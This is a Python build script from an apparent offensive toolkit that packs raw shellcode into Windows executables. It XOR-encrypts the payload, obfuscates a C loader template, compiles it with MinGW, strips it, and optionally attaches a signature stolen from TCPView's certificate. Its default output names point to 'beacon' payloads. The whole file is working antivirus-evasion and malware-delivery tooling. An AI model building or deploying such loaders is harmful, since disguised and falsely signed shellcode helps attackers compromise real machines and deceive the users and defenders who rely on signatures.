#!/usr/bin/python3
from lib import logger, cryptography, utils, sig_thief, obfuscater
import argparse, os

parser = argparse.ArgumentParser(description="Build XOR'd shellcode executables.")
parser.add_argument("-b", "--binary", metavar="", required=True, help="Raw file to encrypt")
parser.add_argument("-k", "--key", metavar="", help="Key to encrypt with (random by default)")
parser.add_argument("-n", "--name", metavar="", help="Name of executable (random by xor_beacon_*.exe)")
parser.add_argument("--x64", default=False, action='store_true', help="Set compiler to x64")
parser.add_argument("--sign", default=False, action='store_true', help="Sign with TCPView's Certificate")
parser.add_argument("--strip", default=False, action='store_true', help="Strip Binary")
args = parser.parse_args()

if __name__ == "__main__":
	logger.banner()
	compiler = 'sudo apt install gcc-mingw-w64'

	if args.key == None:
		key = cryptography.get_hash()
	else:
		key = args.key

	if args.x64:
		arch = 'x64'
		compiler = 'x86_64-w64-mingw32-gcc'
	else:
		arch = 'x86'
		compiler = 'i686-w64-mingw32-gcc'

	logger.msg('Architecture: ',arch,'blue')

	if args.name == None:
		bin_name = 'xor_beacon'
	else:
		bin_name = args.name

	out_file_c = './result/%s_%s.c' % (bin_name,arch)
	out_file_exe = './result/%s_%s.exe' % (bin_name,arch)
	out_file_signed = './result/%s_signed_%s.exe' % (bin_name,arch)

	try:
		file_bytes = open(args.binary, "rb").read()
	except Exception as e:
		logger.msg('Error opening file: ',e,'red')
		quit()

	xord = cryptography.xor(file_bytes, key)
	payload = utils.format_shellcode(xord)

	logger.msg('Key: ',key,'blue')

	cpp = open('./templates/main.c', "rb").read().decode('utf-8')
	cpp = obfuscater.variables(cpp, payload, key)

	if os.system('which %s  > /dev/null 2>&1' % compiler) != 0: 
		logger.msg('Missing Compiler: ',compiler,'red')
		quit()

	with open(out_file_c,'w') as f:
		f.write(cpp)

	compiler_command = '%s %s -o %s' % (compiler,out_file_c, out_file_exe)

	logger.msg('Compiling with: ', compiler_command, 'blue')
	print()

	if os.system(compiler_command) == 0:
		logger.msg('Compiled: ',out_file_exe, 'green')
		if os.path.exists(out_file_exe):
			if args.strip:
					if os.system('strip -s %s' % (out_file_exe)) == 0:
						logger.msg('Stripped: ',out_file_exe,'green')
					else:
						logger.msg('Failed to strip: ',out_file_exe,'red')
			if args.sign:
				if sig_thief.signfile(out_file_exe, './lib/sig/Tcpview.exe_sig', out_file_signed):
					logger.msg('Signed: ', out_file_signed, 'green') 
				else:
					logger.msg('Failed to sign: ', out_file_signed, 'red') 
		else:
			logger.msg('File wasnt written out?',None,'red')
	else:
		logger.msg('Compilation error :(',None,'red')